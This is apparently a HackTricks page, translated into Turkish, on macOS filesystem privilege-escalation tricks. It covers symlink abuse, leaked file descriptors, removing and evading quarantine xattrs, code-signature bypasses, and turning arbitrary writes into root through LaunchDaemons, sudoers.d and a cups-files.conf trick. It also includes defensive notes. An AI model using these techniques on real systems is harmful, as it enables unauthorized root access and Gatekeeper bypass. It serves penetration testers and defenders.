# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX permission combinations

Bir **directory** için üç permission biti, normal bir dosyadakinden farklı bir anlam taşır. `chmod(1)`, bir directory üzerinde kullanıldığında execute bitini "**search**" olarak adlandırır:<sup>[[2]](#references)</sup>

> `0100` Dosyalar için owner tarafından execution yapılmasına izin verir. Directory'ler için owner'ın directory içinde **search** yapmasına izin verir.

- **read** - directory entry'lerini (isimleri) **enumerate** edebilirsiniz.
- **write** - directory içinde entry'ler **create, rename ve delete** edebilirsiniz. Bunun *containing* directory'nin bir özelliği olduğunu, dosyanın özelliği olmadığını unutmayın: parent directory'sine write edebildiğiniz sürece, okuyamadığınız veya write edemediğiniz bir dosyayı silebilirsiniz.
- Bir **subdirectory**'yi silmek için boş olması gerekir; bu da içindeki her şeyi kaldırmak için yeterli haklara sahip olmayı gerektirir.
- Directory'de **sticky bit** (`S_ISVTX`, `/tmp` gibi) varsa bu işlem kısıtlanır — POSIX, bir process'in yalnızca dosyanın sahibi olması, directory'nin sahibi olması veya uygun privileges'a sahip olması durumunda dosyaları silebileceğini ya da yeniden adlandırabileceğini belirtir.<sup>[[1]](#references)</sup>
- **execute / search** - directory içinde **traverse** yapmanıza izin verilir. Pathname resolution her component'i "predecessor'ı tarafından belirtilen directory içinde" bulur; bu nedenle path prefix'in herhangi bir component'i üzerindeki **search** haklarının kaybedilmesi, leaf file'ın kendisi world-readable olsa bile altındaki her şeyi path üzerinden erişilemez hale getirir.<sup>[[1]](#references)</sup>

### Dangerous Combinations

**root tarafından sahip olunan bir file/folder'ın nasıl overwrite edileceği**, ancak:

- Path içindeki bir parent **directory owner** user'dır
- Path içindeki bir parent **directory owner**, **write access** sahibi bir **users group**'udur
- Bir users **group**'unda **file** için **write** access vardır

Önceki kombinasyonlardan herhangi biriyle attacker, privileged arbitrary write elde etmek için beklenen path'e bir **sym/hard link** **inject** edebilir.

### Folder root R+X özel durumu

Bu durum, yukarıdaki pathname-resolution kuralından doğrudan ortaya çıkar. Bir **directory** yalnızca root'a R+X veriyorsa, içindeki dosyalara diğer herkes *path üzerinden* erişemez — ancak **files'ların kendi permission bit'leri yine de permissive olabilir**. Aradaki tek engel directory'dir.

Bu nedenle, dosyayı o directory'den **out** etmenizi sağlayan herhangi bir primitive — attacker tarafından seçilen bir path'i sizin **traverse** edebileceğiniz bir konuma **move/rename/copy** eden privileged bir process — dosyanın kendi mode'unu aşmaya hiç gerek kalmadan arbitrary read'e dönüşür:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Ayrıcalıklı file movers'ları (installer'lar, log rotator'ları, crash/diagnostic collector'ları, backup ve "export" özellikleri) arayın; bunlar daha düşük ayrıcalıklı bir user'dan source path kabul eder.

## Symbolic Link / Hard Link

### İzinleri geniş file/folder

Ayrıcalıklı bir process, **daha düşük ayrıcalıklı bir user** tarafından **kontrol edilebilen** veya daha düşük ayrıcalıklı bir user tarafından **önceden oluşturulabilen** bir **file** içine data yazıyorsa. User, Symbolic veya Hard link kullanarak dosyayı **başka bir file'a yönlendirebilir** ve ayrıcalıklı process bu file'a yazabilir.

Bir attacker'ın **privilege escalation için arbitrary write'ı abuse edebileceği** diğer bölümleri kontrol edin.

### Open `O_NOFOLLOW`

[`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html)'e göre: *"`O_NOFOLLOW` mask içinde kullanılırsa ve `open()`'a geçirilen target file bir symbolic link ise `open()` başarısız olur."* Yalnızca **son** component kontrol edilir — tüm **ara** component'ler yine de resolve edilir ve takip edilir. Bu nedenle `O_NOFOLLOW` ile write işlemini "koruyan" bir developer, target path'in herhangi bir **parent directory**'sine symlink yerleştirilerek yine de attack edilebilir.<sup>[[3]](#references)</sup>

Aynı man page, bu açığı gerçekten kapatan flag'leri belgeler:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"`open()`'a geçirilen path'in ... herhangi bir component'i symbolic link ise `open()` başarısız olur."*
- **`O_RESOLVE_BENEATH`** — *"belirtilen path resolution, fd ile ilişkilendirilmiş directory'den çıkarsa `openat()` başarısız olur."*

Aksi halde, önceden validate ettiğiniz bir directory FD'ye göre relative `openat()` kullanmak veya `realpath()` + yeniden validation yapmak, path'in ortasındaki symlink swap'lerini durdurmanın kalan yollarıdır.

## .fileloc

**`.fileloc`** extension'ına sahip file'lar, diğer application'lara veya binary'lere işaret edebilir; böylece açıldıklarında application/binary çalıştırılır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

`open` çağrısında `O_CLOEXEC` flag'i yoksa file descriptor child process tarafından miras alınır. Dolayısıyla privileged bir process privileged bir file açar ve attacker tarafından kontrol edilen bir process çalıştırırsa attacker **privileged file üzerindeki FD'yi miras alır**.

Canonical örnek, **OS X 10.10'daki `DYLD_PRINT_TO_FILE` LPE**'dir ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld`, ilgili variable `processDyldEnvironmentVariable()` dışında parse edildiği için **restricted (suid root) binary'lerde** bile `DYLD_PRINT_TO_FILE=/path` değerini kabul ediyordu.
- `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` çağrısını yapıyor ve böylece **keyfi bir path'te root-owned file oluşturuyordu**.
- FD **hiçbir zaman kapatılmıyor ve close-on-exec flag'ine sahip değildi**; bu nedenle suid binary'nin her child process'i **root-owned bir file'a yazılabilir FD'yi miras alıyordu**.
- Örneğin `DYLD_PRINT_TO_FILE=/etc/target suid_binary` çalıştırıp ardından child'da miras alınan FD numarasını okumak, keyfi root-owned write işlemlerine izin veriyordu; `fcntl(fd, F_SETFL, 0)` ise `O_APPEND`'i temizleyerek append yerine overwrite yapılmasına bile olanak sağlıyordu.

Aynı yapı, privileged bir process `exec` ile kontrol ettiğiniz bir şeyi çalıştırmadan **önce** bir file açtığında ortaya çıkar (helper tools, `$EDITOR` üzerinden çağrılan `crontab` tarzı editor'ler, bir env-var path'inden açılan log/debug files...). Miras aldığınız FD'leri şu komutla enumerate edin:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
`2` üzerindeki ve kendinizin açamadığı bir dosyaya işaret eden her şey, arbitrary-write (veya arbitrary-read) primitive'idir.

## quarantine xattrs hilelerinden kaçının

### Kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Bir dosya/klasör bu değiştirilemez özniteliğine sahipse üzerine bir xattr eklemek mümkün olmaz
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### xattr desteği olmayan dosya sistemleri

macOS'un bağlayabildiği her dosya sistemi **extended attributes**'ı yerel olarak depolamaz. HFS+ ve APFS bunu yapar; **FAT32, exFAT ve (çoğu) NFS mount'u bunu yapmaz** — macOS bunları `._<filename>` adlı bir **AppleDouble** yan dosyasına yazarak taklit eder ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Bu, quarantine açısından önemlidir; çünkü xattr yalnızca aynı volume'dan gerçekten yazılabilir **ve tekrar okunabilirse** kalıcı olur:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Volume daha sonra `._` companion'ı yok sayan bir path üzerinden okunursa (veya companion kaldırılır/silinirse), dosya **quarantine flag olmadan** gelir — ve unquarantined bir `.app`, [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute) bölümünde ele alındığı üzere App Sandbox'tan kaçmak için yeterlidir.

### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format, bir dosyayı ACE'leriyle birlikte kopyalar.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin gösteriminin sıkıştırması açılan dosyada ACL olarak ayarlanacağını görmek mümkündür. Bu nedenle, bir uygulamayı diğer xattr'ların yazılmasını engelleyen bir ACL ile **AppleDouble** file format kullanarak bir zip file içine sıkıştırırsanız... quarantine xattr uygulamaya ayarlanmaz:

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) bakın.<sup>[[6]](#references)</sup>

Bunu tekrarlamak için önce doğru acl string'i elde etmemiz gerekir:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu çalışsa bile sandbox quarantine xattr'ını önceden yazar)

Gerçekten gerekli değil ama her ihtimale karşı burada bırakıyorum:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## İmza kontrollerini bypass etme

### Platform binaries kontrollerini bypass etme

Bazı security check'ler binary'nin **platform binary** olup olmadığını kontrol eder; örneğin bir XPC service'e bağlanmaya izin vermek için. Ancak https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ adresinde açıklanan bypass yönteminde gösterildiği gibi, bir platform binary'si (örneğin /bin/ls) alıp exploit'i `DYLD_INSERT_LIBRARIES` env variable'ı aracılığıyla dyld kullanarak inject etmek mümkündür.<sup>[[7]](#references)</sup>

### `CS_REQUIRE_LV` ve `CS_FORCED_LV` flag'lerini bypass etme

Çalışan bir binary'nin, aşağıdaki gibi bir kod kullanarak kendi flag'lerini değiştirmesi ve kontrolleri bypass etmesi mümkündür:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Code Signatures Bypass

Bundle'lar, **bundle** içindeki her bir **file**'ın **hash** değerini içeren **`_CodeSignature/CodeResources`** dosyasını barındırır. CodeResources'ın hash değerinin de **executable** içine gömülü olduğunu unutmayın; bu nedenle onunla da oynayamayız.

Ancak bazı dosyaların signature'ı kontrol edilmez; bunlar plist içinde `omit` anahtarına sahip olan dosyalardır, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Bir kaynağın imzasını cli üzerinden hesaplamak mümkündür:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## DMG'leri Mount Etme

Bir kullanıcı, mevcut bazı klasörlerin üzerine bile oluşturulmuş özel bir dmg mount edebilir. Özel içerik içeren bir dmg paketi şu şekilde oluşturulabilir:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Genellikle macOS, `/usr/libexec/diskarbitrationd` tarafından sağlanan `com.apple.DiskArbitrarion.diskarbitrariond` Mach service ile iletişim kurarak diskleri mount eder. LaunchDaemons plist dosyasına `-d` parametresi eklenip yeniden başlatılırsa, logları `/var/log/diskarbitrationd.log` dosyasına kaydeder.\
Ancak `com.apple.driver.DiskImages` kext ile doğrudan iletişim kurmak için `hdik` ve `hdiutil` gibi araçları kullanmak mümkündür.

## Arbitrary Writes

### Periodic sh scripts

Script'iniz bir **shell script** olarak yorumlanabiliyorsa, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell script'inin üzerine yazabilirsiniz.

Bu script'in çalıştırılmasını şu komutla **taklit edebilirsiniz**: **`sudo periodic daily`**

### Daemons

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** gibi bir **LaunchDaemon** oluşturarak, arbitrary bir script çalıştıran plist yazın:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Sadece root olarak çalıştırmak istediğiniz **komutlarla** `/Applications/Scripts/privesc.sh` script'ini oluşturun.

### Sudoers Dosyası

**Arbitrary write** yetkiniz varsa, kendinize **sudo** ayrıcalıkları vermek için **`/etc/sudoers.d/`** klasörü içinde bir dosya oluşturabilirsiniz.

### PATH Dosyaları

**`/etc/paths`** dosyası, PATH env değişkenini oluşturan ana konumlardan biridir. Üzerine yazmak için root olmanız gerekir; ancak **privileged process** tam yol belirtmeden bir **command** çalıştırıyorsa, bu dosyayı değiştirerek söz konusu **command**'i **hijack** edebilirsiniz.

Ayrıca **`/etc/paths.d`** içinde dosyalar oluşturarak **PATH** env değişkenine yeni klasörler yükleyebilirsiniz.

### cups-files.conf

Bu teknik [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) içinde kullanılmıştır.<sup>[[8]](#references)</sup>

Aşağıdaki içeriğe sahip **`/etc/cups/cups-files.conf`** dosyasını oluşturun:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Bu, `/etc/sudoers.d/lpe` dosyasını 777 izinleriyle oluşturur. Sondaki fazladan gereksiz içerik, error log oluşturulmasını tetiklemek içindir.

Ardından, `/etc/sudoers.d/lpe` dosyasına `%staff ALL=(ALL) NOPASSWD:ALL` gibi privilege escalation için gereken config'i yazın.

Sonra `/etc/cups/cups-files.conf` dosyasını tekrar düzenleyerek `LogFilePerm 700` belirtin; böylece yeni sudoers dosyası `cupsctl` çağrıldığında geçerli hale gelir.

### Sandbox Escape

Bir FS arbitrary write ile macOS sandbox'ından kaçmak mümkündür. Bazı örnekler için [macOS Auto Start](../../../../macos-auto-start-locations.md) sayfasına bakabilirsiniz; ancak yaygın yöntemlerden biri, başlangıçta bir command çalıştıran Terminal preferences dosyasını `~/Library/Preferences/com.apple.Terminal.plist` konumuna yazmak ve bunu `open` kullanarak çağırmaktır.

## Diğer kullanıcılar olarak writable dosyalar oluşturma

Çok yaygın bir privesc primitive'i, **privileged process'in sizin için kontrol ettiğiniz bir directory içinde bir file oluşturmasını** sağlamak ve ardından bu file üzerindeki **write access**'i korumaktır. Bunun için iki bileşen gerekir:

1. Sahip olduğunuz bir directory (veya **inheritable ACL** ayarlayabildiğiniz bir directory); böylece içinde oluşturulan her şey permissions'ınızı devralır.
2. Bir debug/logging environment variable, config file veya helper'ın XPC API'si aracılığıyla **nerede** file oluşturacağının belirtilebildiği privileged/`suid` bir process.

Oluşturulan file'ın başka bir kullanıcıya ait olmasına rağmen sizin tarafınızdan writable olmasını sağlayan şey **inheritable ACL** kısmıdır. `file_inherit` / `directory_inherit` inheritance flag'leri [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) içinde belgelenmiştir:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Artık ayrıcalıklı bir process’in `$DIRNAME` içinde oluşturduğu herhangi bir dosya **sizin tarafınızdan yazılabilir**. Bu dizin daha sonra **root olarak çalıştırılan** bir konumsa (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, bir LaunchDaemon dizini...), bu doğrudan root escalation sağlar. Dosyayı elde ettikten sonra içine ne yazmanız gerektiği için yukarıdaki [Sudoers File](#sudoers-file) ve [cups-files.conf](#cups-filesconf) bölümlerine bakın.

"env variable bir root process’inin dosya oluşturmasına neden olur ve FD size leak olur" zincirinin tam uygulamalı bir örneği için yukarıdaki [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) bölümüne bakın.

## POSIX Shared Memory

**POSIX shared memory**, POSIX uyumlu işletim sistemlerindeki process’lerin ortak bir bellek alanına erişmesini sağlayarak diğer inter-process communication yöntemlerine kıyasla daha hızlı iletişim kurulmasını sağlar. Bu işlem, `shm_open()` ile bir shared memory object oluşturmayı veya açmayı, `ftruncate()` ile boyutunu ayarlamayı ve `mmap()` kullanarak process’in adres alanına map etmeyi içerir. Process’ler daha sonra bu bellek alanından doğrudan okuma ve bu alana doğrudan yazma yapabilir. Eşzamanlı erişimi yönetmek ve data corruption’ı önlemek için mutex veya semaphore gibi synchronization mekanizmaları sıklıkla kullanılır. Son olarak process’ler `munmap()` ve `close()` ile shared memory’nin mapping’ini kaldırır ve bağlantısını kapatır; isteğe bağlı olarak `shm_unlink()` ile memory object’i kaldırır. Bu sistem, birden fazla process’in paylaşılan dataya hızlı ve verimli şekilde erişmesi gereken ortamlarda etkili bir IPC yöntemidir.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Tüketici Kod Örneği</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS Guarded descriptors**, kullanıcı uygulamalarındaki **file descriptor işlemlerinin** güvenliğini ve güvenilirliğini artırmak için macOS'ta sunulan bir güvenlik özelliğidir. Bu guarded descriptor'lar, file descriptor'lar ile kernel tarafından uygulanan belirli kısıtlamaları veya "guard"ları ilişkilendirmek için bir yol sağlar.

Bu özellik, **yetkisiz file access** veya **race condition** gibi belirli güvenlik açığı sınıflarını önlemek için özellikle kullanışlıdır. Bu güvenlik açıkları, örneğin bir thread'in bir file description'a erişerek **başka bir vulnerable thread'e erişim sağlaması** veya bir file descriptor'ın **vulnerable bir child process** tarafından devralınması durumlarında ortaya çıkar. Bu işlevle ilgili bazı fonksiyonlar şunlardır:

- `guarded_open_np`: Guard ile bir FD açar
- `guarded_close_np`: Kapatır
- `change_fdguard_np`: Bir descriptor üzerindeki guard flag'lerini değiştirir (guard protection'ı kaldırmak dahil)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
